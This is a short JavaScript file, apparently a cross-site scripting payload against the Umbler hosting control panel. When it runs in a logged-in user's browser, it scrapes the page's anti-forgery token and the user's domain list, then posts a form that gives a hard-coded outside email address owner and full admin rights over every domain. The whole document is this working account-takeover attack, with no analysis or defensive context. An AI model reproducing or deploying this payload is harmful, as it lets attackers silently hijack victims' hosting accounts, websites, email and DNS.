async function sendAccess() {
    const response = await fetch("https://app.umbler.com/access/newuser");
    const html = await response.text();
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, "text/html");

    const domainInputs = doc.querySelectorAll("input[id^='DomainPermissions_'][id$='__IdentifierName']");
    const token = doc.querySelector('input[name="__RequestVerificationToken"]').value;

    const form = new URLSearchParams();
    form.append('NewAccessEmail', 'elsecman@proton.me');
    
    domainInputs.forEach(function(input, index) {
        form.append(`DomainPermissions[${index}].IdentifierName`, input.value);
        form.append(`DomainPermissions[${index}].IsOwner`, true);
        form.append(`DomainPermissions[${index}].Email`, '');
        form.append(`DomainPermissions[${index}].PermissionChanged`, true);
        form.append(`DomainPermissions[${index}].IsAdmin`, true);
        form.append(`DomainPermissions[${index}].WebSiteAdmin`, true);
        form.append(`DomainPermissions[${index}].EmailAdmin`, true);
        form.append(`DomainPermissions[${index}].DomainAdmin`, true);
    });

    form.append('__RequestVerificationToken', token);

    fetch("https://app.umbler.com/access/newuser", {
        method: "POST",
        body: form,
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        }
    });
}

sendAccess()
